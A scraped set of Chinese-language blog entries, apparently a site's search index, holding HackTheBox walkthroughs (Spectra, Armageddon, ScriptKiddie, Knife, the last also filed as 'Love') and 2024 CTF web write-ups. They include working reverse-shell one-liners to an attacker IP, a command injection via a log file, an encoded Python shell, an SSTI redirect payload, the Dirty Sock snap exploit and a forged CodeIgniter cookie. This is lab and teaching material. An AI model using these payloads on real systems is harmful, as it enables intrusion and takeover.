如果成功读取到密码，则会使用 \"/usr/local/sbin/inject-keys.py\" 工具将密码注入到登录提示中。这样就可以实现自动登录。 5. 脚本中的注释提到，为了让自动登录正常工作，你必须已经在设备上创建了一个账户。否则，在启动时不会显示登录提示，注入的键会执行错误的操作。 在/etc/autologin/passwd发现密码SummerHereWeCome!! 在katie用户处发现user的flag，所以很大概率是katie的密码 登陆成功后，cat user.txt katie@spectra ~ $ sudo -l User katie may run the following commands on spectra: (ALL) SETENV: NOPASSWD: /sbin/initctl 可以root权限执行initctl 看一下可以编辑的服务sudo initctl list 找到几个以test开头的可疑服务，进行查看一下 所有的服务都在/etc/init cat /etc/init/test.conf description \"Test node.js server\" author \"katie\" start on filesystem or runlevel [2345] stop on shutdown script export HOME=\"/srv\" echo $$ \u003e /var/run/nodetest.pid exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js end script pre-start script echo \"[`date`] Node Test Starting\" \u003e\u003e /var/log/nodetest.log end script pre-stop script rm /var/run/nodetest.pid echo \"[`date`] Node Test Stopping\" \u003e\u003e /var/log/nodetest.log end script 直接利用test.conf进行提权 sudo initctl start test ","date":"2024-04-16","objectID":"/hackthebox-spectra/:0:0","tags":["内网渗透 Linux"],"title":"HackTheBox-Spectra","uri":"/hackthebox-spectra/"},{"categories":["HackTheBox"],"content":" sudo nmap --min-rate 100000 -A -sS Host is up (0.18s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-title: Welcome to Armageddon | Armageddon |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-generator: Drupal 7 (http://drupal.org) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94%E=4%D=4/15%OT=22%CT=1%CU=37686%PV=Y%DS=2%DC=T%G=Y%TM=661CA4C OS:3%P=x86_64-apple-darwin21.6.0)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=I%TS=A)SE OS:Q(SP=108%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=I OS:%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11 OS:NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=71 OS:20%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=4 OS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40 OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q OS:=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y OS:%DFI=N%T=40%CD=S) Network Distance: 2 hops TRACEROUTE (using port 1723/tcp) HOP RTT ADDRESS 1 132.89 ms 10.10.16.1 2 214.85 ms 10.129.48.89 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.92 seconds 存在22端口和80端口 80端口存在Web服务，并且存在很多文件 其中/CHANGELOG.txt存在版本信息 Drupal 7.56, 2017-06-21 利用msf搜索一下 利用exploit/unix/webapp/drupal_drupalgeddon2这个漏洞 成功获得一个shell 但是权限很低 无法打开任何flag 目标还开放了一个22端口，这里考虑密码复用，连接22端口 通过/etc/passwd得知存在brucetherealadmin用户，在配置文件和数据库中找一下 在sites/default/settings.php中存在数据库账号和密码 $databases = array ( 'default' =\u003e array ( 'default' =\u003e array ( 'database' =\u003e 'drupal', 'username' =\u003e 'drupaluser', 'password' =\u003e 'CQHEy@9M*m23gBVj', 'host' =\u003e 'localhost', 'port' =\u003e '', 'driver' =\u003e 'mysql', 'prefix' =\u003e '', ), ), ); 在数据库中找到疑似SSH的密码 mysql -h localhost -u \"drupaluser\" -pCQHEy@9M*m23gBVj \"drupal\" -e \"select uid,name,pass from users;\" brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt 利用cmd5查出hash值，成功登陆 sudo -l查看详细权限 可以用root权限运行snap命令 参考文章 https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html 生成命令 python2 -c 'print\"aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw\"+ \"A\"*4256 + \"==\"' | base64 -d \u003e exploit.snap 运行sudo /usr/bin/snap install --devmode exploit.snap 切换到dirty_sock用户，密码同样是dirty_sock sudo cat /root/root.txt ","date":"2024-04-16","objectID":"/hackthebox-armageddon/:0:0","tags":["内网渗透 Linux"],"title":"HackTheBox-Armageddon","uri":"/hackthebox-armageddon/"},{"categories":["HackTheBox"],"content":"使用nmap进行扫描 sudo nmap --min-rate 10000 -sS -Pn -sV 10.129.95.150 Nmap scan report for 10.129.95.150 Host is up (0.15s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 53/tcp filtered domain 5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds 5000端口存在Web服务，访问查看 一个类似于黑客工具的网站 其中msfvenom存在漏洞 利用其中的工具搜msfvenom漏洞 存在APK template command injection漏洞， 利用msf直接生成 use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection set payload cmd/unix/reverse_netcat 设置好参数进行反弹shell 利用msf中的exploit/multi/handler接收shell 利用python升级成TTY格式 python3 -c 'import pty;pty.spawn(\"bash\")' 获得user.txt中的flag 进入pwn用户，其中有一个scanlosers.sh脚本 #!/bin/bash log=/home/kid/2/hackers cd /home/pwn/ cat $log | cut -d' ' -f3- | sort -u | while read ip; do sh -c \"nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2\u003e\u00261 \u003e/dev/null\" \u0026 done if [[ $(wc -l \u003c $log) -gt 0 ]]; then echo -n \u003e $log; fi 该脚本会一直扫描/home/kid/logs/hackers的目录文件的IP地址，并且该脚本并未对hackers文件传入的内容进行过滤，所以我们直接在hackers下面写入内容即可 echo \"x x x 127.0.0.1; bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.16.4/8888 0\u003e\u00261' # .\" \u003e hackers 成功反弹`shell pwn@scriptkiddie:~$ whoami whoami pwn 执行sudo -l发现可以用root权限执行msfconsole Matching Defaults entries for pwn on scriptkiddie: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User pwn may run the following commands on scriptkiddie: (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole 执行msfconsole获取root.txt sudo msfconsole ","date":"2024-04-14","objectID":"/hackthebox-scriptkiddie/:0:0","tags":["内网渗透 Linux"],"title":"HackTheBox-ScriptKiddie","uri":"/hackthebox-scriptkiddie/"},{"categories":["HackTheBox"],"content":"使用nmap进行扫描 sudo nmap --min-rate 10000 -sS -Pn -sV 10.129.211.145 Nmap scan report for 10.129.211.145 Host is up (0.15s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 53/tcp filtered domain 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.76 seconds 开启了22端口和80端口，访问80端口 在其返回包看到PHP版本信息 HTTP/1.1 200 OK Date: Sat, 13 Apr 2024 10:07:00 GMT Server: Apache/2.4.41 (Ubuntu) X-Powered-By: PHP/8.1.0-dev Vary: Accept-Encoding Content-Length: 5815 Connection: close Content-Type: text/html; charset=UTF-8 此版本是存在后门，可以直接进行RCE 直接反弹一个shell到本地 User-Agentt:zerodiumsystem(\"/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.16.4/8888 0\u003e\u00261'\"); 获得user.txt的flag james@knife:~$ cat user.txt cat user.txt 8f76f62dae4f23ad7c61094fff67a86d 继续进行提权 sudo -l进行查看james用户的权限 Matching Defaults entries for james on knife: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on knife: (root) NOPASSWD: /usr/bin/knife 可以无需密码以root权限执行/usr/bin/knife命令 利用python获取一个交互式shell python3 -c \"__import__('pty').spawn('/bin/bash')\" 利用knife进行提权 sudo /usr/bin/knife exec -E 'exec \"/bin/sh\"' ","date":"2024-04-14","objectID":"/hackthebox-love/:0:0","tags":["内网渗透 Windows"],"title":"HackTheBox-Love","uri":"/hackthebox-love/"},{"categories":["HackTheBox"],"content":"使用nmap进行扫描 sudo nmap --min-rate 10000 -sS -Pn -sV 10.129.211.145 Nmap scan report for 10.129.211.145 Host is up (0.15s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 53/tcp filtered domain 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.76 seconds 开启了22端口和80端口，访问80端口 在其返回包看到PHP版本信息 HTTP/1.1 200 OK Date: Sat, 13 Apr 2024 10:07:00 GMT Server: Apache/2.4.41 (Ubuntu) X-Powered-By: PHP/8.1.0-dev Vary: Accept-Encoding Content-Length: 5815 Connection: close Content-Type: text/html; charset=UTF-8 此版本是存在后门，可以直接进行RCE 直接反弹一个shell到本地 User-Agentt:zerodiumsystem(\"/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.16.4/8888 0\u003e\u00261'\"); 获得user.txt的flag james@knife:~$ cat user.txt cat user.txt 8f76f62dae4f23ad7c61094fff67a86d 继续进行提权 sudo -l进行查看james用户的权限 Matching Defaults entries for james on knife: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on knife: (root) NOPASSWD: /usr/bin/knife 可以无需密码以root权限执行/usr/bin/knife命令 利用python获取一个交互式shell python3 -c \"__import__('pty').spawn('/bin/bash')\" 利用knife进行提权 sudo /usr/bin/knife exec -E 'exec \"/bin/sh\"' ","date":"2024-04-14","objectID":"/hackthebox-knife/:0:0","tags":["内网渗透 Linux"],"title":"HackTheBox-Knife","uri":"/hackthebox-knife/"},{"categories":["CTF"],"content":" ezphp \u003c?php highlight_file(__FILE__); // flag.php if (isset($_POST['f'])) { echo hash_file('md5', $_POST['f']); } ?\u003e 利用此篇文章的方法，读取文件 https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle \u003c?php if (isset($_GET['ezphpPhp8'])) { highlight_file(__FILE__); } else { die(\"No\"); } $a = new class { function __construct() { } function getflag() { system('cat /flag'); } }; unset($a); $a = $_GET['ezphpPhp8']; $f = new $a(); $f-\u003egetflag(); ?\u003e 匿名类的利用 https://hi-arkin.com/archives/php-anonymous-stdClass.html /flag.php?ezphpPhp8=class%40anonymous%00/var/www/html/flag.php%3A7%240 ","date":"2024-04-03","objectID":"/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/:1:0","tags":["红明谷CTF Web"],"title":"红明谷-2024-Web","uri":"/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/"},{"categories":["CTF"],"content":" playground访问/www.zip，得到 [2022-01-01 12:34:56] Authentication successful - User: admin Pass: 2e525e29e465f45d8d7c56319fe73036 替换Authorization: Basic YWRtaW46MmU1MjVlMjllNDY1ZjQ1ZDhkN2M1NjMxOWZlNzMwMzY= 利用readfile得到disable_function eval,assert,fwrite,file_put_contents,phpinfo,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,lin,putenv,mail,chroot,chgrp,dl,readlink pcntl_exec没有被过滤，利用Python反弹shell /?cmd=pcntl_exec('/usr/bin/python',['-c','%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%32%34%2e%32%32%30%2e%32%31%35%2e%38%22%2c%31%32%33%34%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%69%6d%70%6f%72%74%20%70%74%79%3b%20%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29']); 但是flag为admin权限需要提权 在config.inc.php里面发现密码，但是并没有开启相关服务， 在/etc/passwd中发现admin用户，猜测可能密码复用，利用su进行提权 ","date":"2024-04-03","objectID":"/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/:2:0","tags":["红明谷CTF Web"],"title":"红明谷-2024-Web","uri":"/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/"},{"categories":["CTF"],"content":" unauth #[macro_use] extern crate rocket; use std::fs; use std::fs::File; use std::io::Write; use std::process::Command; use rand::Rng; #[get(\"/\")] fn index() -\u003e String { fs::read_to_string(\"main.rs\").unwrap_or(String::default()) } #[post(\"/rust_code\", data = \"\u003ccode\u003e\")] fn run_rust_code(code: String) -\u003e String{ if code.contains(\"std\") { return \"Error: std is not allowed\".to_string(); } //generate a random 5 length file name let file_name = rand::thread_rng() .sample_iter(\u0026rand::distributions::Alphanumeric) .take(5) .map(char::from) .collect::\u003cString\u003e(); if let Ok(mut file) = File::create(format!(\"playground/{}.rs\", \u0026file_name)) { file.write_all(code.as_bytes()); } if let Ok(build_output) = Command::new(\"rustc\") .arg(format!(\"playground/{}.rs\",\u0026file_name)) .arg(\"-C\") .arg(\"debuginfo=0\") .arg(\"-C\") .arg(\"opt-level=3\") .arg(\"-o\") .arg(format!(\"playground/{}\",\u0026file_name)) .output() { if !build_output.status.success(){ fs::remove_file(format!(\"playground/{}.rs\",\u0026file_name)); return String::from_utf8_lossy(build_output.stderr.as_slice()).to_string(); } } fs::remove_file(format!(\"playground/{}.rs\",\u0026file_name)); if let Ok(output) = Command::new(format!(\"playground/{}\",\u0026file_name)) .output() { if !output.status.success(){ fs::remove_file(format!(\"playground/{}\",\u0026file_name)); return String::from_utf8_lossy(output.stderr.as_slice()).to_string(); } else{ fs::remove_file(format!(\"playground/{}\",\u0026file_name)); return String::from_utf8_lossy(output.stdout.as_slice()).to_string(); } } return String::default(); } #[launch] fn rocket() -\u003e _ { let figment = rocket::Config::figment() .merge((\"address\", \"0.0.0.0\")); rocket::custom(figment).mount(\"/\", routes![index,run_rust_code]) } 限制了std，利用内联写C进行绕过 extern \"C\" {fn system(s: *const u8) -\u003e i32;} fn main() { unsafe{system(b\"cat /flag\" as *const u8)}; } ","date":"2024-04-03","objectID":"/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/:3:0","tags":["红明谷CTF Web"],"title":"红明谷-2024-Web","uri":"/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/"},{"categories":["CTF"],"content":" Simp1escapeCurlController下存在SSRF漏洞，但是限制了不能是本地IP，利用302跳转绕过 结合AdminController存在Thymelaef模版注入(只允许本地访问) 打一发模版注入漏洞 https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89 exp.php \u003c?php header(\"Location:http://127.0.0.1:8080/getsites?hostname=%5B%5B%24%7BT(java.lang.Boolean).forName(%22com.fasterxml.jackson.databind.ObjectMapper%22).newInstance().readValue(%22%7B%7D%22%2CT(org.springframework.expression.spel.standard.SpelExpressionParser)).parseExpression(%22T(Runtime).getRuntime().exec('bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjQuMjIwLjIxNS44LzEyMzQgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D')%22).getValue()%7D%5D%5D\"); ?\u003e /curl?url=http://ip:80/exp.php ","date":"2024-04-03","objectID":"/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/:4:0","tags":["红明谷CTF Web"],"title":"红明谷-2024-Web","uri":"/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/"},{"categories":["CTF"],"content":" CodeIgniterpoc \u003c?php $sessid = ''; while (strlen($sessid) \u003c 32) { $sessid .= mt_rand(0, mt_getrandmax()); } $encryption_key=\"ksd92\"; $data = array( 'username' =\u003e 'huahua', 'password' =\u003e 'huahua', 'is_logged_in' =\u003e true, 'session_id' =\u003e md5(uniqid($sessid, TRUE)), 'ip_address' =\u003e '127.0.0.1', 'user_agent' =\u003e 'huahua', 'last_activity' =\u003e time(), 'superadmin' =\u003e true ); $cookie_data = serialize($data); $cookie_data .= hash_hmac('sha1',$cookie_data,$encryption_key); echo urlencode($cookie_data); ?\u003e ","date":"2024-03-30","objectID":"/ctf-babycodeigniter-web%E5%87%BA%E9%A2%98%E8%AE%B01/:1:0","tags":["CTF-Web"],"title":"CTF-BabyCodeIgniter-Web出题记(1)","uri":"/ctf-babycodeigniter-web%E5%87%BA%E9%A2%98%E8%AE%B01/"},{"categories":["CTF"],"content":" WriteUphttp://www.mehmetince.net/codeigniter-object-injection-vulnerability-via-encryption-key/ 根据此篇文章改编 利用弱口令admin/123456登录之后，发现并没有上传权限，探究一下源码中的登录逻辑 function validateuser() { $username=addslashes($this-\u003einput-\u003epost('username')); $password=addslashes($this-\u003einput-\u003epost('password')); $query=$this-\u003edb-\u003equery(\"SELECT * from user WHERE username='$username' and password='$password' limit 1\"); if($query-\u003enum_rows() \u003e 0) { $data = array( 'username' =\u003e $username, 'password' =\u003e $password, 'is_logged_in' =\u003e true, 'superadmin' =\u003e false ); $this-\u003esession-\u003eset_userdata($data); return 1; } else { return 0; } } 登录成功之后，利用设置了$this-\u003esession-\u003eset_userdata($data); $data = array( 'username' =\u003e $username, 'password' =\u003e $password, 'is_logged_in' =\u003e true, 'superadmin' =\u003e false ); 再来看上传文件的源码 public function upload(){ $super = $this-\u003esession-\u003euserdata('superadmin'); if($super === true){ echo \"bypass\"; if (! $this-\u003eupload-\u003edo_upload('file')) { $error = array('error' =\u003e $this-\u003eupload-\u003edisplay_errors()); var_dump($error); } else { $data = array('upload_data' =\u003e $this-\u003eupload-\u003edata()); var_dump($data); } }else{ echo \"You are not a super administrator！！！\"; } } 检查了这个地方 $super = $this-\u003esession-\u003euserdata('superadmin'); if($super === true){ ... } 但是在登录成功后，设置的superadmin并非true而是false 所以并无上传权限，但是登录成功之后，返回给我们了 cookie，而非PHPSESSID，验证信息存储在了客户端，而非服务端，就导致我们可以篡改。 来看一下生成cookie的代码逻辑 在application/config/autoload.php中设置了自动加载session类 $autoload['libraries'] = array('database','session','upload'); 于是进入system/libraries/Session.php中进行查看， 首先会进入__construct()操作 public function __construct($params = array()) { log_message('debug', \"Session Class Initialized\"); // Set the super object to a local variable for use throughout the class $this-\u003eCI =\u0026 get_instance(); // Set all the session preferences, which can either be set // manually via the $params array above or via the config file foreach (array('sess_encrypt_cookie', 'sess_use_database', 'sess_table_name', 'sess_expiration', 'sess_expire_on_close', 'sess_match_ip', 'sess_match_useragent', 'sess_cookie_name', 'cookie_path', 'cookie_domain', 'cookie_secure', 'sess_time_to_update', 'time_reference', 'cookie_prefix', 'encryption_key') as $key) { $this-\u003e$key = (isset($params[$key])) ? $params[$key] : $this-\u003eCI-\u003econfig-\u003eitem($key); } if ($this-\u003eencryption_key == '') { show_error('In order to use the Session class you are required to set an encryption key in your config file.'); } // Load the string helper so we can use the strip_slashes() function $this-\u003eCI-\u003eload-\u003ehelper('string'); // Do we need encryption? If so, load the encryption class if ($this-\u003esess_encrypt_cookie == TRUE) { $this-\u003eCI-\u003eload-\u003elibrary('encrypt'); } // Are we using a database? If so, load it if ($this-\u003esess_use_database === TRUE AND $this-\u003esess_table_name != '') { $this-\u003eCI-\u003eload-\u003edatabase(); } // Set the \"now\" time. Can either be GMT or server time, based on the // config prefs. We use this to set the \"last activity\" time $this-\u003enow = $this-\u003e_get_time(); // Set the session length. If the session expiration is // set to zero we'll set the expiration two years from now. if ($this-\u003esess_expiration == 0) { $this-\u003esess_expiration = (60*60*24*365*2); } // Set the cookie name $this-\u003esess_cookie_name = $this-\u003ecookie_prefix.$this-\u003esess_cookie_name; // Run the Session routine. If a session doesn't exist we'll // create a new one. If it does, we'll update it. if ( ! $this-\u003esess_read()) { $this-\u003esess_create(); } else { $this-\u003esess_update(); } // Delete 'old' flashdata (from last request) $this-\u003e_flashdata_sweep(); // Mark all new flashdata as old (data will be deleted before next request) $this-\u003e_flashdata_mark(); // Delete expired sessions if necessary $this-\u003e_sess_gc(); log_message('debug', \"Session routines successfully run\"); } 首先会进行读取，如果没有接收到cookie，则会进入$this-\u003esess_create();进行创建 function sess_create() { $sessid = ''; while (strlen($sessid) \u003c 32) { $sessid .= mt_rand(0, mt_getrandmax()); } // To make the session ID even more secure we'll combine it with the user's IP $sessid .= $this-\u003eCI-\u003einput-\u003eip_address(); $this-\u003euserdata = array( 'session_id' =\u003e md5(uniqid($sessid, TRUE)), 'ip_address' =\u003e $this-\u003eCI-\u003einput-\u003eip_address(), 'user_agent' =\u003e substr($this-\u003eCI-\u003einput-\u003euser_agent(), 0, 120), 'last_activity' =\u003e $this-\u003enow, 'user_data' =\u003e '' ); // Save the data to the DB if needed if ($this-\u003esess_use_database === TRUE) { $this-\u003eCI-\u003edb-\u003equery($this-\u003eCI-\u003edb-\u003einsert_string($this-\u003esess_table_name, $this-\u003euserdata)); } // Write the cookie $this-\u003e_set_cookie(); } 会初始化一些值 $this-\u003euserdata = array( 'session_id' =\u003e md5(uniqid($sessid, TRUE)), 'ip_address' =\u003e $this-\u003eCI-\u003einput-\u003eip_address(), 'user_agent' =\u003e substr($this-\u003eCI-\u003einput-\u003euser_agent(), 0, 120), 'last_activity' =\u003e $this-\u003enow, 'user_data' =\u003e '' ); 接着调用了$this-\u003e_set_cookie(); function _set_cookie($cookie_data = NULL) { if (is_null($cookie_data)) { $cookie_data = $this-\u003euserdata; } // Serialize the userdata for the cookie $cookie_data = $this-\u003e_serialize($cookie_data); if ($this-\u003esess_encrypt_cookie == TRUE) { $cookie_data = $this-\u003eCI-\u003eencrypt-\u003eencode($cookie_data); } $cookie_data .= hash_hmac('sha1', $cookie_data, $this-\u003eencryption_key); $expire = ($this-\u003esess_expire_on_close === TRUE) ? 0 : $this-\u003esess_expiration + time(); // Set the cookie setcookie( $this-\u003esess_cookie_name, $cookie_data, $expire, $this-\u003ecookie_path, $this-\u003ecookie_domain, $this-\u003ecookie_secure ); 序列化传入的数组，接着序列化之后，拼接了一个需要密钥\"加密的字符串\"，然后利用setcookie函数，设置了我们的cookie $cookie_data = $this-\u003e_serialize($cookie_data); ...... $cookie_data .= hash_hmac('sha1', $cookie_data, $this-\u003eencryption_key); ...... setcookie( $this-\u003esess_cookie_name, $cookie_data, $expire, $this-\u003ecookie_path, $this-\u003ecookie_domain, $this-\u003ecookie_secure ); 也就是说，我们只需要将登录成功后设置的 cookie 'superadmin' =\u003e false改为'superadmin' =\u003e true即可，上面说到没有 cookie 才会进行创建，有 cookie 则会执行sess_read()函数 function sess_read() { // Fetch the cookie $session = $this-\u003eCI-\u003einput-\u003ecookie($this-\u003esess_cookie_name); // No cookie? Goodbye cruel world!... if ($session === FALSE) { log_message('debug', 'A session cookie was not found.'); return FALSE; } // HMAC authentication $len = strlen($session) - 40; if ($len \u003c= 0) { log_message('error', 'Session: The session cookie was not signed.'); return FALSE; } // Check cookie authentication $hmac = substr($session, $len); $session = substr($session, 0, $len); // Time-attack-safe comparison $hmac_check = hash_hmac('sha1', $session, $this-\u003eencryption_key); $diff = 0; for ($i = 0; $i \u003c 40; $i++) { $xor = ord($hmac[$i]) ^ ord($hmac_check[$i]); $diff |= $xor; } if ($diff !== 0) { log_message('error', 'Session: HMAC mismatch. The session cookie data did not match what was expected.'); $this-\u003esess_destroy(); return FALSE; } // Decrypt the cookie data if ($this-\u003esess_encrypt_cookie == TRUE) { $session = $this-\u003eCI-\u003eencrypt-\u003edecode($session); } // Unserialize the session array $session = $this-\u003e_unserialize($session); // Is the session data we unserialized an array with the correct format? if ( ! is_array($session) OR ! isset($session['session_id']) OR ! isset($session['ip_address']) OR ! isset($session['user_agent']) OR ! isset($session['last_activity'])) { $this-\u003esess_destroy(); return FALSE; } // Is the session current? // if (($session['last_activity'] + $this-\u003esess_expiration) \u003c $this-\u003enow) // { // $this-\u003esess_destroy(); // return FALSE; // } // // Does the IP Match? // if ($this-\u003esess_match_ip == TRUE AND $session['ip_address'] != $this-\u003eCI-\u003einput-\u003eip_address()) // { // $this-\u003esess_destroy(); // return FALSE; // } // // Does the User Agent Match? // if ($this-\u003esess_match_useragent == TRUE AND trim($session['user_agent']) != trim(substr($this-\u003eCI-\u003einput-\u003euser_agent(), 0, 120))) // { // 